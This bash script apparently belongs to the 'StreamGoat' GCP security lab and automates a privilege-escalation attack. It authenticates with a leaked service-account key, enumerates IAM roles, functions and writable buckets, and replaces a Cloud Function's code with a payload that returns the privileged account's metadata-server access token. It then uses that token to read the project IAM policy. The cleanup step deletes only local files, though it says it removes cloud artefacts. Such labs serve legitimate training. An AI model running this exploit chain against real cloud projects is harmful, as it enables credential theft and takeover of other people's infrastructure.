#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 3              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Simulated Key Compromise & Auth\n"
  printf "  • Step 2. Permission enumeration for stolen metadata\n"
  printf "  • Step 3. Enumerate Service Accounts and Custom Roles\n"
  printf "  • Step 4. Cloud Functions Enumeration & Source Extraction\n"
  printf "  • Step 5. Replace Code & Trigger Enumeration Function\n"
  printf "  • Step 6. Post-Exploitation Privilege Review\n"
  printf "  • Step 7. Removing items we created during compromitation (metadata, cloud function, local temporary files)\n"

}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in gcloud curl jq zip; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

#############################################
# Step 1. Simulated Key Compromise & Auth
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Use Leaked Key (base64 JSON) for GCP Auth ===" "${RESET}"

CFG="streamgoat-scenario-3"
SA_KEY_FILE="/tmp/.streamgoat/${CFG}-key.json"
mkdir -p /tmp/.streamgoat

while :; do
  read -r -p "Paste base64-encoded GCP service account key: " BASE64_KEY
  if [ -z "$BASE64_KEY" ]; then
    err "Key input is empty. Try again."
    continue
  fi

  # Attempt to decode and validate
  if echo "$BASE64_KEY" | base64 -d > "$SA_KEY_FILE" 2>/dev/null; then
    if jq -e 'has("type") and .type == "service_account" and has("private_key")' "$SA_KEY_FILE" >/dev/null 2>&1; then
      ok "Key decoded and appears valid"
      break
    else
      err "Decoded file is not a valid service account key (JSON structure mismatch)"
    fi
  else
    err "Failed to decode base64 input"
  fi
done

# Create or switch gcloud config
if gcloud config configurations describe "$CFG" >/dev/null 2>&1; then
  gcloud config configurations activate "$CFG" >/dev/null 2>&1
else
  gcloud config configurations create "$CFG" >/dev/null 2>&1
  gcloud config configurations activate "$CFG" >/dev/null 2>&1
fi

step "Authenticating using provided key"
gcloud auth activate-service-account --key-file="$SA_KEY_FILE" --quiet
ok "Authentication complete"

PROJECT_ID="$(jq -r '.project_id' "$SA_KEY_FILE")"
[ -n "$PROJECT_ID" ] || { err "Could not extract project_id from key"; exit 1; }

gcloud config set project "$PROJECT_ID" >/dev/null 2>&1

# Validate API access
step "Verifying access by calling Cloud Functions API..."
if ! gcloud functions list --limit=1 >/dev/null 2>&1; then
  err "Failed to list functions — either wrong permissions or project access issue"
  exit 1
else
  ok "Verified: service account has valid API access"
fi

step "Generating access_token from activated service account"
ACCESS_TOKEN="$(gcloud auth print-access-token 2>/dev/null || true)"

if [ -z "$ACCESS_TOKEN" ]; then
  err "Failed to generate access token via gcloud. Aborting."
  exit 1
fi

MASKED_TOKEN="${ACCESS_TOKEN:0:6}...${ACCESS_TOKEN: -6}"
ok "Access token obtained: ${CYAN}${MASKED_TOKEN}${RESET}"

# Save exported vars to env file
ENVFILE="/tmp/.streamgoat/${CFG}.env"
{
  echo "export GOOGLE_APPLICATION_CREDENTIALS='$SA_KEY_FILE'"
  echo "export CLOUDSDK_ACTIVE_CONFIG_NAME='$CFG'"
  echo "export STREAMGOAT_PROJECT='$PROJECT_ID'"
  echo "export GOOGLE_ACCESS_TOKEN='$ACCESS_TOKEN'"
  echo "export CLOUDSDK_CORE_DISABLE_PROMPTS=1"
  echo 'export CLOUDSDK_PAGER=""'
} > "$ENVFILE"

chmod 600 "$ENVFILE"
ok "Environment config saved at ${YELLOW}${ENVFILE}${RESET}"
printf "Local environment variables are set. We can now use the gcloud CLI or send curl requests directly to the cloud provider.\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2: Permission enumeration for stolen metadata
################################################################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen metadata  ===" "${RESET}"

try() {
  local desc="$1"; shift
  local output rc
  set +e
  output="$("$@" 2>&1)"
  rc=$?
  set -e

  # Detect IAM-related denial messages
  if echo "$output" | grep -qiE 'permissionDenied|not authorized|Required.*permission'; then
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  elif [ $rc -ne 0 ]; then
    printf "[%s] %s[DENY]%s  %s (exit $rc)\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  else
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  fi
}

printf "Running basic list requests to gather initial reconnaissance on our available privileges.\n\n"

source $ENVFILE

try "Compute: list instances" gcloud compute instances list
try "Compute: get instances info" gcloud compute instances describe streamgoat-vm-a --zone="us-central1-a"
try "IAM: list service-accounts" gcloud iam service-accounts list
try "Functions: list functions" gcloud functions list
try "Buckets: list buckets" gcloud storage buckets list
try "Logging: list sinks" gcloud logging sinks list
try "Secrets: list secrets" gcloud secrets list
try "App services: list app services" gcloud app services list
try "Pubsub: list topics" gcloud pubsub topics list
try "BigQuery: list datasets" gcloud bigquery datasets list
try "CloudSQL: list sql instances" gcloud sql instances list


printf "\nDuring reconnaissance and initial privilege enumeration, we detected some level of access to the IAM service. Let's dig deeper and see if we can extract more information from it.\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Enumerate streamgoat SAs and Custom Roles
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Enumerate Service Accounts and Roles ===" "${RESET}"
source "$ENVFILE"

PROJECT_ID="${STREAMGOAT_PROJECT:-$(gcloud config get-value project)}"

step "Enumerating Service Accounts"
SERVICE_ACCOUNTS=$(gcloud iam service-accounts list \
  --filter="email:streamgoat" \
  --format="value(email)" 2>/dev/null)

if [ -z "$SERVICE_ACCOUNTS" ]; then
  err "No service accounts found"
else
  printf "\nFound service accounts:\n"
  for sa in $SERVICE_ACCOUNTS; do
    printf "  ${GREEN}• %s${RESET}\n" "$sa"
  done
fi

step "Enumerating Custom Roles"
CUSTOM_ROLES=$(gcloud iam roles list \
  --project="$PROJECT_ID" \
  --filter="name:streamgoat" \
  --format="value(name)" 2>/dev/null)

if [ -z "$CUSTOM_ROLES" ]; then
  err "No custom roles with prefix 'streamgoat' found"
else
  for role in $CUSTOM_ROLES; do
    printf "\n${YELLOW}Role: ${role}${RESET}\n"
  
    role_id="${role##*/}"
  
    PERMS=$(gcloud iam roles describe "$role_id" \
      --project="$PROJECT_ID" \
      --format="json" 2>/dev/null | jq -r '.includedPermissions[]')
  
    if [ -z "$PERMS" ]; then
      err "Failed to describe $role_id (no permission or empty result)"
    else
      for perm in $PERMS; do
        printf "       ${CYAN}- %s${RESET}\n" "$perm"
      done
    fi
  done
fi

step "Checking project IAM policy for role bindings (optional)"
if gcloud projects get-iam-policy "$PROJECT_ID" --format="none" >/dev/null 2>&1; then
  ok "Able to read IAM policy — full mapping possible"
else
  err "Cannot read IAM policy (missing resourcemanager.projects.getIamPolicy). Skipping role bindings."
fi

printf "\nWe couldn't collect all IAM policy information we wanted, but the data we did gather is still valuable: 4 custom service accounts and a permission list set on the service account we control (${YELLOW}streamgoat-sa-maintainer${RESET}). The account ${YELLOW}streamgoat-sa-fulladmin${RESET} looks potentially interesting for privilege escalation. Notably, it has permissions like ${CYAN}cloudfunctions.functions.update${RESET} and ${CYAN}storage.objects.create${RESET}. If we can find a Cloud Function and bucket we can write to, we might be able to escalate our privileges.\n"

read -r -p "Step 3 complete. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Cloud Functions Enumeration & Source Extraction
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Cloud Functions Enumeration & Source Extraction ===" "${RESET}"
source "$ENVFILE"

REGION="us-central1"


step "Enumerating Cloud Functions in region: $REGION"
FUNCTIONS=$(gcloud functions list \
  --regions="$REGION" \
  --filter="name:streamgoat" \
  --format="value(name)" 2>/dev/null)

if [ -z "$FUNCTIONS" ]; then
  err "No streamgoat functions found in region $REGION"
  exit 0
fi

for FUNC_NAME in $FUNCTIONS; do
  printf "\n${YELLOW}Function: ${FUNC_NAME}${RESET}\n"

  FUNC_DESC=$(gcloud functions describe "$FUNC_NAME" \
    --region="$REGION" \
    --format=json 2>/dev/null)

  if [ -z "$FUNC_DESC" ]; then
    err "Failed to describe $FUNC_NAME"
    continue
  fi

  RUNTIME=$(echo "$FUNC_DESC" | jq -r '.runtime')
  ENTRY_POINT=$(echo "$FUNC_DESC" | jq -r '.entryPoint')
  SERVICE_ACCOUNT=$(echo "$FUNC_DESC" | jq -r '.serviceAccountEmail')
  SOURCE_URL=$(echo "$FUNC_DESC" | jq -r '.sourceArchiveUrl // empty')

  printf "       ${CYAN}Runtime:${RESET}         $RUNTIME\n"
  printf "       ${CYAN}Entry point:${RESET}     $ENTRY_POINT\n"
  printf "       ${CYAN}Service Account:${RESET} $SERVICE_ACCOUNT\n"
  printf "       ${CYAN}Source Archive:${RESET}  $SOURCE_URL\n"

  if [[ "$SOURCE_URL" =~ ^gs:// ]]; then
    step "Trying to download source archive from: $SOURCE_URL"
    TMP_FILE="/tmp/.streamgoat/$(basename "$SOURCE_URL")"
    if gsutil cp "$SOURCE_URL" "$TMP_FILE" >/dev/null 2>&1; then
      ok "Downloaded function source to $TMP_FILE"
    else
      err "Failed to download source archive (maybe no storage access?)"
    fi
  else
    info "Function source is not stored in GCS"
  fi
done

step "Enumerating accessible GCS buckets"
# Get only buckets with 'streamgoat' in their name
BUCKET_CANDIDATES="$(gcloud storage buckets list \
  --format="value(name)" 2>/dev/null | grep streamgoat || true)"

if [ -z "$BUCKET_CANDIDATES" ]; then
  err "No buckets found with in the name or no permissions to list them"
else
  # Check each streamgoat-* bucket for write access
  while read -r bucket; do
    test_file=".streamgoat/test-$(uuidgen | cut -c1-8).txt"
    echo "streamgoat-test" > /tmp/$test_file

    if gsutil cp "/tmp/$test_file" "gs://$bucket/" >/dev/null 2>&1; then
      ok "Writable bucket found: ${YELLOW}$bucket${RESET}"
      STREAMGOAT_BUCKET="$bucket"
      break
    else
      info "Bucket found but not writable: $bucket"
    fi
  done <<< "$BUCKET_CANDIDATES"

  if [ -z "${STREAMGOAT_BUCKET:-}" ]; then
    err "No writable buckets found"
  fi
fi

printf "\nExcellent! We discovered the function ${YELLOW}'streamgoat-calc-function'${RESET} and a bucket we can write to in order to upload our malicious code for privilege escalation. This demonstrates how function code updates work in GCP. We also observe that this function runs as the privileged ${CYAN}'streamgoat-sa-fulladmin'${RESET} service account. Normally, without ${YELLOW}'iam.serviceAccounts.actAs'${RESET}, we couldn't update the function's code — a security control by GCP — but fortunately, our compromised service account has that permission.\n"

read -r -p "Step 4 complete. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Replace Code & Trigger Enumeration Function
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Code Injection & Runtime Enumeration ===" "${RESET}"
source "$ENVFILE"

printf "\nThe code we're about to upload will request an access token for the assigned service account and return it in the response.\n"

read -r -p "Press Enter to proceed (or Ctrl+C to abort)..." _ || true

FUNC_NAME="streamgoat-calc-function"
TMP_DIR="/tmp/.streamgoat"
ZIP_NAME="streamgoat-injected-$(uuidgen | cut -c1-8).zip"
ZIP_PATH="$TMP_DIR/$ZIP_NAME"

step "Creating malicious Python Cloud Function payload..."

# Write malicious code
cat > "$TMP_DIR/main.py" <<EOF
import requests

def get_metadata(request):
    try:
        token = requests.get(
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            headers={"Metadata-Flavor": "Google"}
        ).text

        identity = requests.get(
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
            headers={"Metadata-Flavor": "Google"}
        ).text

        return f"[+] SA Identity: {identity}\\n[+] Access Token:\\n{token}", 200

    except Exception as e:
        return f"[!] Error: {str(e)}", 500
EOF

echo "requests" > "$TMP_DIR/requirements.txt"

# Create ZIP
cd "$TMP_DIR"
zip -q "$ZIP_NAME" main.py requirements.txt
cd - >/dev/null

ok "Malicious function ZIP created at $ZIP_PATH"

step "Updating function '$ZIP_NAME' with injected payload to identified writable bucket"
gsutil cp "$ZIP_PATH" "gs://$STREAMGOAT_BUCKET/" >/dev/null 2>&1
ok "Prepared ZIP archive uploaded into bucket"

step "Cloud Function '$FUNC_NAME' patching and waiting for to be ACTIVE..."
PATCH_RESPONSE_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
  -X PATCH \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "https://cloudfunctions.googleapis.com/v1/projects/$PROJECT_ID/locations/us-central1/functions/$FUNC_NAME?updateMask=sourceArchiveUrl,entryPoint" \
  -d "{
    \"sourceArchiveUrl\": \"gs://${STREAMGOAT_BUCKET}/${ZIP_NAME}\",
    \"entryPoint\": \"get_metadata\"
  }")

if [ "$PATCH_RESPONSE_CODE" -eq 200 ]; then
  ok "New code has been uploaded and accepted (HTTP 200)"
else
  err "Failed to patch the function — HTTP status: $PATCH_RESPONSE_CODE"
  exit 1
fi

spin_start "Polling deployment status..."
sleep 180
while :; do
  STATUS=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://cloudfunctions.googleapis.com/v1/projects/${PROJECT_ID}/locations/${REGION}/functions/${FUNC_NAME}" \
    | jq -r '.status')

  if [ "$STATUS" == "ACTIVE" ]; then
    break
  fi

  sleep 15
done

spin_stop
ok "Function is now ACTIVE"

ID_TOKEN=$(gcloud auth print-identity-token)
TRIGGER_URL=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://cloudfunctions.googleapis.com/v1/projects/${PROJECT_ID}/locations/${REGION}/functions/${FUNC_NAME}" \
  | jq -r '.httpsTrigger.url')

step "Invoking Cloud Function: $TRIGGER_URL"

RESPONSE=$(curl -s -H "Authorization: Bearer $ID_TOKEN" "$TRIGGER_URL")

echo -e "${GREEN}[+] Function Response:${RESET}\n$RESPONSE"

printf "We successfully received the token for the service account ${YELLOW}'streamgoat-sa-fulladmin'${RESET}. Let's verify what roles are assigned to it.\n"

read -r -p "Step 5 complete. Press Enter to continue (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Post-Exploitation Privilege Review
#############################################

printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 6. Post-Exploitation Privilege Review ===" "${RESET}"

SA_LINE="$(echo "$RESPONSE" | grep 'SA Identity')"
TOKEN_LINE="$(echo "$RESPONSE" | grep 'access_token')"

if [ -z "$SA_LINE" ] || [ -z "$TOKEN_LINE" ]; then
  err "Failed to extract service account identity or token"
  exit 1
fi

# Extract values using parameter expansion
FULLADMIN_SA="$(echo "$SA_LINE" | cut -d':' -f2 | xargs)"
ACCESS_TOKEN_2="$(echo "$TOKEN_LINE" | jq -r '.access_token')"

IAM_POLICY_RESPONSE=$(curl -s -w "%{http_code}" -o $TMP_DIR/iam_policy.json \
  -H "Authorization: Bearer $ACCESS_TOKEN_2" \
  -H "Content-Type: application/json" \
  -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}:getIamPolicy" \
  -d '{}')

# Check if successful
if [ "$IAM_POLICY_RESPONSE" != "200" ]; then
  err "Failed to retrieve IAM policy (HTTP $IAM_POLICY_RESPONSE). Token likely lacks 'resourcemanager.projects.getIamPolicy'"
  cat $TMP_DIR/iam_policy.json
  exit 1
fi

ok "IAM policy retrieved. Parsing roles for: $FULLADMIN_SA"
printf "Assigned roles:\n"
# Extract roles for the targeted service account
${MAGENTA}
jq -r --arg sa "serviceAccount:$FULLADMIN_SA" '
  .bindings[] | select(.members[]? == $sa) |
  "- Role: \(.role)"
' $TMP_DIR/iam_policy.json ${RESET}|| err "No roles found or invalid policy format"

printf "\nGreat! We've confirmed that the service account ${YELLOW}'streamgoat-sa-fulladmin'${RESET} is privileged - we now have control over the entire project.\n"

read -rp "Step 6 complete. Press Enter to proceed..."

#############################################
# Step 7. Cleanup
#############################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Removing items we created during compromitation (metadata, cloud function, local temporary files)  ===" "${RESET}"

set +e
step "Removing localy stored file in /tmp/.streamgoat"
rm -rf /tmp/.streamgoat
set -e
